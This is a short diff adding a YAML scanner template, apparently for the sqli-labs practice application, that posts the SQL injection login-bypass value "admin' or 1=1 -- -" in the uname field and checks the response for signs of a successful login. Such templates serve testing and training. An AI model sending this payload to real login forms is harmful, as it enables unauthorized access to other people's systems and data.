@@ -1,0 +1,9 @@
+name: less11-post-sqli
+request:
+  method: POST
+  path: /Less-11/
+  param: uname
+  value: "admin' or 1=1 -- -"
+matcher:
+  type: word
+  words: ["Login name", "Your Login name"]
